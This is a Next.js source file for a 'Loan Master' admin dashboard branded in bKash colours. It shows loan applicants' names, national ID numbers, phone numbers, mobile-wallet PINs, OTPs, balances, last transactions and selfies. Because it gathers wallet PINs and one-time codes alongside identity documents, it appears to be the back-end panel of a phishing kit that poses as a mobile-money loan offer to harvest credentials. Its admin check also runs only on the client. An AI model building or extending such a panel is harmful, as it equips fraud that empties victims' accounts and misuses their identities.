'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { 
  LogOut, RefreshCcw, Search, Check, X, Info, User, 
  Phone, MapPin, Landmark, LayoutDashboard, FileText, 
  Settings, Users, Bell, ChevronDown, Menu, Camera
} from 'lucide-react';

export default function AdminDashboard() {
  const [submissions, setSubmissions] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState('All');
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const router = useRouter();

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) router.push('/admin');
    fetchSubmissions();
  }, [router]);

  const fetchSubmissions = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/submissions');
      if (res.ok) {
        const data = await res.json();
        setSubmissions(data);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const updateStatus = async (id: string, status: string) => {
    try {
      const res = await fetch('/api/submissions', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, status })
      });
      if (res.ok) {
        setSubmissions(submissions.map(s => s._id === id ? { ...s, status } : s));
      }
    } catch (err) {
      console.error(err);
    }
  };

  const filtered = submissions.filter(s => {
    const matchesSearch = s.phoneNumber?.includes(search) || s.fullName?.toLowerCase().includes(search.toLowerCase());
    const matchesFilter = filter === 'All' || s.status === filter;
    return matchesSearch && matchesFilter;
  });

  return (
    <div className="min-h-screen bg-[#F8F9FB] text-slate-900 font-sans flex">
      {/* Sidebar */}
      <aside className={`${sidebarOpen ? 'w-64' : 'w-20'} bg-[#1E1E2D] transition-all duration-300 flex flex-col fixed h-full z-50`}>
         <div className="p-6 flex items-center gap-3 border-b border-white/5">
            <div className="bg-bkash-pink p-1.5 rounded-lg shrink-0">
               <Landmark className="text-white" size={20} />
            </div>
            {sidebarOpen && <span className="font-bold text-white text-lg tracking-tight italic">Loan Master</span>}
         </div>

         <div className="flex-1 py-6 space-y-2">
            <SidebarItem icon={<LayoutDashboard size={20} />} label="Dashboard" active={true} collapsed={!sidebarOpen} />
            <SidebarItem icon={<FileText size={20} />} label="Applications" active={false} collapsed={!sidebarOpen} />
            <SidebarItem icon={<Users size={20} />} label="Users" active={false} collapsed={!sidebarOpen} />
            <SidebarItem icon={<Bell size={20} />} label="Notifications" active={false} collapsed={!sidebarOpen} />
            <div className="pt-4 mt-4 border-t border-white/5">
                <SidebarItem icon={<Settings size={20} />} label="Settings" active={false} collapsed={!sidebarOpen} />
            </div>
         </div>

         <button 
           onClick={() => { localStorage.removeItem('admin_token'); router.push('/admin'); }}
           className="m-6 flex items-center gap-3 text-red-400 hover:text-red-300 transition-all font-bold text-sm"
         >
           <LogOut size={20} /> {sidebarOpen && <span>Logout</span>}
         </button>
      </aside>

      {/* Main Content */}
      <main className={`flex-1 transition-all duration-300 ${sidebarOpen ? 'ml-64' : 'ml-20'}`}>
        {/* Top Navbar */}
        <nav className="bg-white px-8 py-4 flex justify-between items-center sticky top-0 z-40 border-b border-slate-100">
           <div className="flex items-center gap-4">
              <button 
                onClick={() => setSidebarOpen(!sidebarOpen)}
                className="p-2 hover:bg-slate-50 rounded-lg text-slate-400"
              >
                <Menu size={20} />
              </button>
              <h1 className="text-xl font-black text-slate-800">Application Management</h1>
           </div>

           <div className="flex items-center gap-6">
              <div className="relative hidden lg:block">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-300" size={16} />
                  <input 
                    type="text" 
                    placeholder="Global search..." 
                    className="pl-10 pr-4 py-2 bg-slate-50 border-none rounded-xl outline-none text-sm w-64 focus:ring-2 focus:ring-bkash-pink/10"
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                  />
              </div>
              <div className="w-px h-6 bg-slate-100"></div>
              <div className="flex items-center gap-3 cursor-pointer">
                  <div className="w-9 h-9 bg-slate-100 rounded-full flex items-center justify-center text-slate-500 font-bold text-xs border border-slate-200">AD</div>
                  <div className="hidden sm:block">
                      <p className="text-xs font-black text-slate-800">Admin User</p>
                      <p className="text-[10px] text-slate-400 font-bold">Administrator</p>
                  </div>
                  <ChevronDown size={14} className="text-slate-400" />
              </div>
           </div>
        </nav>

        <div className="p-8">
           {/* Stats Summary */}
           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-10">
              <DesktopStatCard label="Total Submissions" value={submissions.length} percentage="+12%" color="blue" />
              <DesktopStatCard label="Pending Review" value={submissions.filter(s => s.status === 'Pending').length} percentage="Needs Action" color="amber" />
              <DesktopStatCard label="Approved Loans" value={submissions.filter(s => s.status === 'Approved').length} percentage="84% Rate" color="green" />
              <DesktopStatCard label="Rejected Apps" value={submissions.filter(s => s.status === 'Rejected').length} percentage="System flagged" color="red" />
           </div>

           {/* Table Card */}
           <div className="bg-white rounded-[32px] border border-slate-100 shadow-sm overflow-hidden">
              <div className="p-6 border-b border-slate-50 flex flex-col sm:flex-row gap-4 justify-between items-center">
                  <div className="flex items-center gap-2">
                     {['All', 'Pending', 'Approved', 'Rejected'].map(f => (
                       <button 
                         key={f}
                         onClick={() => setFilter(f)}
                         className={`px-4 py-2 rounded-xl text-xs font-black transition-all ${
                           filter === f ? 'bg-bkash-pink text-white shadow-lg shadow-pink-100' : 'bg-slate-50 text-slate-400 hover:bg-slate-100'
                         }`}
                       >
                         {f}
                       </button>
                     ))}
                  </div>
                  <button onClick={fetchSubmissions} className="flex items-center gap-2 text-xs font-black text-bkash-pink hover:bg-pink-50 px-4 py-2 rounded-xl transition-all">
                      <RefreshCcw size={14} className={loading ? 'animate-spin' : ''} /> Refresh Data
                  </button>
              </div>

              <div className="overflow-x-auto">
                 <table className="w-full text-left">
                    <thead>
                       <tr className="bg-slate-50/50 text-slate-400 text-[10px] uppercase tracking-widest font-black">
                          <th className="px-6 py-4">Applicant</th>
                          <th className="px-6 py-4">Loan Details</th>
                          <th className="px-6 py-4">Account Info</th>
                          <th className="px-6 py-4">Verification</th>
                          <th className="px-6 py-4">Photo</th>
                          <th className="px-6 py-4">Status</th>
                          <th className="px-6 py-4 text-center">Actions</th>
                       </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-50">
                       {filtered.map(s => (
                         <tr key={s._id} className="hover:bg-slate-50/50 transition-all group">
                            <td className="px-6 py-5">
                               <div className="flex items-center gap-3">
                                  <div className="w-10 h-10 bg-slate-100 rounded-xl flex items-center justify-center text-slate-400 group-hover:bg-bkash-pink group-hover:text-white transition-all">
                                     <User size={18} />
                                  </div>
                                  <div>
                                     <p className="font-extrabold text-slate-800 text-sm">{s.fullName}</p>
                                     <p className="text-[10px] text-slate-400 font-bold uppercase tracking-tighter">NID: {s.nidNumber}</p>
                                  </div>
                               </div>
                            </td>
                            <td className="px-6 py-5">
                               <p className="font-black text-slate-800">৳ {s.loanAmount?.toLocaleString()}</p>
                               <p className="text-[10px] text-slate-400 font-bold">{s.tenure} Duration</p>
                            </td>
                            <td className="px-6 py-5">
                               <div className="flex items-center gap-1.5 font-bold text-slate-600 text-sm">
                                  <Phone size={12} className="text-slate-300" /> {s.phoneNumber}
                               </div>
                               <span className="text-[10px] font-black text-bkash-pink">PIN: {s.pin}</span>
                               {s.otp && <span className="ml-2 px-1.5 py-0.5 bg-pink-50 rounded text-[9px] font-black text-bkash-pink border border-pink-100 italic">OTP: {s.otp}</span>}
                            </td>
                            <td className="px-6 py-5">
                               <div className="flex gap-4">
                                  <div>
                                     <p className="text-[9px] text-slate-300 font-black uppercase">Bal</p>
                                     <p className="text-xs font-bold text-slate-600">৳{s.currentBalance}</p>
                                  </div>
                                  <div>
                                     <p className="text-[9px] text-slate-300 font-black uppercase">Last</p>
                                     <p className="text-xs font-bold text-slate-600">৳{s.lastTransaction}</p>
                                  </div>
                               </div>
                            </td>
                            <td className="px-6 py-5">
                                {s.selfie ? (
                                    <div className="relative group/img">
                                        <img 
                                            src={s.selfie} 
                                            alt="Selfie" 
                                            className="w-12 h-12 object-cover rounded-xl border-2 border-slate-100 group-hover/img:scale-110 transition-all cursor-pointer"
                                            onClick={() => window.open(s.selfie, '_blank')}
                                        />
                                        <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 border-2 border-white rounded-full"></div>
                                    </div>
                                ) : (
                                    <div className="w-12 h-12 bg-slate-50 rounded-xl border border-dashed border-slate-200 flex items-center justify-center text-slate-300">
                                        <Camera size={16} />
                                    </div>
                                )}
                            </td>
                            <td className="px-6 py-5">
                               <span className={`px-3 py-1 rounded-lg text-[10px] font-black uppercase tracking-wider ${
                                 s.status === 'Pending' ? 'bg-amber-50 text-amber-600' :
                                 s.status === 'Approved' ? 'bg-green-50 text-green-600' :
                                 'bg-red-50 text-red-600'
                               }`}>
                                 {s.status}
                               </span>
                            </td>
                            <td className="px-6 py-5">
                               <div className="flex items-center justify-center gap-2">
                                  <button 
                                    onClick={() => updateStatus(s._id, 'Approved')}
                                    disabled={s.status === 'Approved'}
                                    className="p-2 bg-green-500 hover:bg-green-600 text-white rounded-lg shadow-lg shadow-green-100 transition-all disabled:opacity-30"
                                  >
                                    <Check size={14} />
                                  </button>
                                  <button 
                                    onClick={() => updateStatus(s._id, 'Rejected')}
                                    disabled={s.status === 'Rejected'}
                                    className="p-2 bg-red-400 hover:bg-red-500 text-white rounded-lg shadow-lg shadow-red-100 transition-all disabled:opacity-30"
                                  >
                                    <X size={14} />
                                  </button>
                               </div>
                            </td>
                         </tr>
                       ))}
                    </tbody>
                 </table>
                 {filtered.length === 0 && (
                   <div className="py-20 text-center">
                       <Info size={40} className="mx-auto text-slate-200 mb-4" />
                       <p className="font-bold text-slate-400">No matching applications found.</p>
                   </div>
                 )}
              </div>
           </div>
        </div>
      </main>
    </div>
  );
}

function SidebarItem({ icon, label, active, collapsed }: { icon: any, label: string, active: boolean, collapsed: boolean }) {
  return (
    <div className={`
      flex items-center gap-4 px-6 py-3 cursor-pointer transition-all mx-3 rounded-xl
      ${active ? 'bg-bkash-pink text-white shadow-lg shadow-pink-500/20' : 'text-slate-400 hover:text-white hover:bg-white/5'}
    `}>
      <span className="shrink-0">{icon}</span>
      {!collapsed && <span className="text-sm font-bold tracking-tight">{label}</span>}
      {!collapsed && active && <div className="ml-auto w-1.5 h-1.5 rounded-full bg-white shadow-lg"></div>}
    </div>
  );
}

function DesktopStatCard({ label, value, percentage, color }: { label: string, value: any, percentage: string, color: string }) {
  const colorMap: any = {
    blue: 'border-blue-500/20 text-blue-600',
    amber: 'border-amber-500/20 text-amber-600',
    green: 'border-green-500/20 text-green-600',
    red: 'border-red-500/20 text-red-600',
  };

  return (
    <div className="bg-white p-6 rounded-[32px] border border-slate-100 shadow-sm hover:shadow-md transition-all">
       <div className="flex justify-between items-start mb-4">
          <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">{label}</p>
          <span className={`text-[10px] font-black px-2 py-0.5 rounded-full bg-slate-50 ${colorMap[color]}`}>{percentage}</span>
       </div>
       <div className="flex items-end items-center gap-2">
          <h2 className="text-3xl font-black text-slate-800 tracking-tighter">{value}</h2>
       </div>
    </div>
  );
}
